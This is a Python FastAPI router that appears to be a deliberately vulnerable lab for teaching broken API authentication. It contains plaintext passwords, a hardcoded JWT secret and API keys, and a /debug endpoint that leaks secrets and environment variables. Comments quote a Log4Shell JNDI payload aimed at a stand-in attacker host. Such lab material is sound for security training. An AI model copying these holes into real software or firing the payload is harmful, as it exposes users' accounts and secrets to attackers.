from fastapi import APIRouter, Form, HTTPException, Depends, Request, Response, Header
from fastapi.responses import RedirectResponse
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel
import jwt
import json
import logging
import re
import os
from datetime import datetime, timedelta
from typing import Optional

router = APIRouter(prefix="/api2", tags=["API2: Broken User Authentication"])

# 模擬資料庫
USERS = {
    "admin": {
        "password": "admin123",
        "role": "admin",
        "api_key": "admin_api_key_123",
        "permissions": ["read", "write", "delete", "admin"]
    },
    "power_user": {
        "password": "power123",
        "role": "power_user",
        "api_key": "power_api_key_456",
        "permissions": ["read", "write"]
    },
    "user1": {
        "password": "user123",
        "role": "user",
        "api_key": "user_api_key_789",
        "permissions": ["read"]
    }
}

# JWT 設定
JWT_SECRET = "your-secret-key"
JWT_ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

# OAuth2 設定
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

class Token(BaseModel):
    access_token: str
    token_type: str
    permissions: list

class User(BaseModel):
    username: str
    role: str
    permissions: list

class UserInDB(User):
    password: str
    api_key: str

def verify_password(plain_password, hashed_password):
    # 實際應用中應該使用安全的密碼雜湊
    return plain_password == hashed_password

def get_user(username: str):
    if username in USERS:
        user_dict = USERS[username]
        return UserInDB(
            username=username,
            role=user_dict["role"],
            permissions=user_dict["permissions"],
            password=user_dict["password"],
            api_key=user_dict["api_key"]
        )
    return None

def authenticate_user(username: str, password: str):
    user = get_user(username)
    if not user:
        return False
    if not verify_password(password, user.password):
        return False
    return user

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return encoded_jwt

async def get_current_user(token: str = Depends(oauth2_scheme)):
    credentials_exception = HTTPException(
        status_code=401,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
    except jwt.JWTError:
        raise credentials_exception
    user = get_user(username)
    if user is None:
        raise credentials_exception
    return user

async def get_current_active_user(current_user: User = Depends(get_current_user)):
    return current_user

def verify_api_key(api_key: str = Header(...)):
    for user in USERS.values():
        if user["api_key"] == api_key:
            return True
    raise HTTPException(
        status_code=401,
        detail="Invalid API Key"
    )

def verify_admin(current_user: User = Depends(get_current_active_user)):
    if current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Not enough permissions"
        )
    return current_user

@router.post("/token", response_model=Token)
async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends()):
    user = authenticate_user(form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=401,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username}, expires_delta=access_token_expires
    )
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "permissions": user.permissions
    }

@router.get("/users/me", response_model=User)
async def read_users_me(current_user: User = Depends(get_current_active_user)):
    return current_user

@router.get("/admin/users")
async def get_all_users(
    current_user: User = Depends(verify_admin),
    api_key: str = Depends(verify_api_key)
):
    return {"users": list(USERS.keys())}

@router.get("/admin/stats")
async def get_admin_stats(
    current_user: User = Depends(verify_admin),
    api_key: str = Depends(verify_api_key)
):
    return {
        "total_users": len(USERS),
        "admin_count": sum(1 for u in USERS.values() if u["role"] == "admin"),
        "power_user_count": sum(1 for u in USERS.values() if u["role"] == "power_user"),
        "regular_user_count": sum(1 for u in USERS.values() if u["role"] == "user")
    }

@router.get("/power/data")
async def get_power_data(
    current_user: User = Depends(get_current_active_user),
    api_key: str = Depends(verify_api_key)
):
    if "write" not in current_user.permissions:
        raise HTTPException(
            status_code=403,
            detail="Not enough permissions"
        )
    return {"data": "This is power user data"}

@router.get("/user/data")
async def get_user_data(current_user: User = Depends(get_current_active_user)):
    return {"data": "This is regular user data"}

@router.get("/")
async def root():
    return {"message": "API2 Root"}

@router.get("/v1/login")
async def login_v1():
    # 重定向到新版本
    return RedirectResponse(url="/api2/login", status_code=301)

@router.get("/v1/profile")
async def get_profile_v1():
    # 重定向到新版本
    return RedirectResponse(url="/api2/profile", status_code=301)

@router.get("/profile")
async def get_profile(request: Request):
    # 模擬 Log4j 漏洞 (CVE-2021-44228)
    # 實際的 Log4j 漏洞會執行 ${jndi:ldap://attacker.com/exploit}
    user_agent = request.headers.get("user-agent", "")
    logging.info(f"Profile access: {user_agent}")
    
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        user = payload["user"]
        return {
            "username": user,
            "email": f"{user}@example.com",
            "role": USERS[user]["role"]
        }
    except:
        raise HTTPException(status_code=401, detail="Invalid token")

@router.get("/v1/admin")
async def admin_v1():
    # 重定向到新版本
    return RedirectResponse(url="/api2/admin", status_code=301)

@router.get("/admin")
async def admin_panel(request: Request):
    # 模擬 Log4j 漏洞 (CVE-2021-44228)
    # 實際的 Log4j 漏洞會執行 ${jndi:ldap://attacker.com/exploit}
    user_agent = request.headers.get("user-agent", "")
    logging.info(f"Admin panel access: {user_agent}")
    
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        if USERS[payload["user"]]["role"] != "admin":
            raise HTTPException(status_code=403, detail="Not authorized")
        return {"message": "Welcome to admin panel", "users": list(USERS.keys())}
    except:
        raise HTTPException(status_code=401, detail="Invalid token")

@router.get("/debug")
async def debug_info():
    # 違反安全：洩露敏感資訊
    return {
        "jwt_secret": JWT_SECRET,
        "users": USERS,
        "environment": dict(os.environ)
    } 